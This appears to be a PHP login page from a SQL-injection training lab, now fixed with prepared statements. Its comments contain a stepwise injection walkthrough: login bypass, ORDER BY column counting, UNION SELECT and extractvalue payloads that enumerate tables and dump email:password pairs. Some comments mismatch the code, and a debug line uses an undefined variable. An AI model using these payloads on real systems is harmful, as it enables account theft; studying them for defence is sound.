<?php
// SQL Injection Vulnerable Login Page
include "database.php";

if (isset($_POST['login'])) {
    // $emall = $_POST['email']; // No sanitisation
    // $password = $_POST['password']; // No sanitisation

    $sanitized_email = mysqli_real_escape_string($database, $_POST['email']); // Sanitise email input
    $sanitized_password = mysqli_real_escape_string($database, $_POST['password']);

    // Note: Even with mysqli_real_escape_string, this code is still vulnerable to SQL injection if the character encoding is not properly handled. Prepared statements are the recommended way to prevent SQL injection.

    // Vulnerable SQL query with direct user input concatenation
    //searching => OR
    // $query = "SELECT * FROM users WHERE email='$sanitized_email' AND password='$sanitized_password'";
    $query_stmt = mysqli_prepare($database, "SELECT * FROM users WHERE email=? AND password=?");
    mysqli_stmt_bind_param($query_stmt, "ss", $sanitized_email, $sanitized_password);
    mysqli_stmt_execute($query_stmt);
    $result = mysqli_stmt_get_result($query_stmt);

    // $result = mysqli_query($database, $query);
    if (!$result) {
        echo "SQL ERROR: " . htmlspecialchars(mysqli_error($database));
    } elseif (mysqli_num_rows($result) > 0) {
        echo "Login successful! (" . mysqli_num_rows($result) . " row(s))";
    } else {
        echo "Invalid email or password. (0 rows)";
    }
    // For debugging purposes, show the raw query (never do this in production)
    echo "<div class='debug'>DEBUG — Query executed: <code>" . htmlspecialchars($query) . "</code></div>";
    // Login bypass example:
    // Email: ' OR '1'='1
    // Password: ' OR '1'='1

    //     Payload	Expected output
    // ' ORDER BY 1 -- 	Invalid email or password. (0 rows) ← query worked
    // ' ORDER BY 2 -- 	Invalid email or password. (0 rows)
    // ' ORDER BY 3 -- 	maybe still 0 rows
    // ' ORDER BY 99 -- 	SQL ERROR: Unknown column '99' in 'order clause' ← too high

    // Then move on to UNION
    // Once you know the count (let's say it's N), use that exact number of columns. For example, if N = 4:
    // ' UNION SELECT 1,2,3,4 -- 

    // This time you should see "Login successful! (1 row(s))" because UNION SELECT produced a synthetic row. Then swap the numbers for real data:

    // Important note about the trailing space
    // --  in MySQL requires a space (or newline/tab) after the two dashes. If your input box trims trailing whitespace, use # instead:

    // Try ' ORDER BY 99 --  now and you should finally see a real SQL error message confirming the injection point.

    // ' UNION SELECT 1,2,3,4 -- should show you a row with those numbers, confirming the injection and column count. Then you can replace those numbers with actual column names to extract data:

    //' UNION SELECT database(),version(),user(),@@hostname,5,6 -- should show you the database name, MySQL version, current user, and hostname in the first four columns of the result row. You can then target specific tables and columns to extract sensitive data like usernames and passwords.
    //' AND extractvalue(1,concat(0x7e,(SELECT database()))) -- should show you the database name in an XML error message, confirming the injection point and allowing you to extract data using subqueries in the same way.
    //' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))) -- should show you a list of all tables in the current database, allowing you to identify the target table (e.g., users) for further data extraction.
    //' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users' AND table_schema=database()))) -- should show you a list of all columns in the users table, allowing you to identify the target columns (e.g., email, password) for final data extraction.
    //' UNION SELECT GROUP_CONCAT(email,0x3a,password SEPARATOR 0x0a),2,3,4,5,6 FROM users -- 
    // should show you a list of all email:password pairs from the users table, allowing you to compromise user accounts.
    //' UNION SELECT id,fullname,email,phone,password,5,6 FROM users -- 
    // should show you the id, fullname, email, phone, password, and username of all users in the users table, allowing you to compromise user accounts and potentially escalate privileges if any admin accounts are present.
}
// Write a code that is secure against SQL injection by using prepared statements and parameterized queries.
?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <form action="login.php" method="POST">
        <h3>Login</h3>
        <input name="email" type="text"> <br><br>
        <input name="password" type="password"> <br><br>
        <button name="login">Login</button>
    </form>
</body>

</html>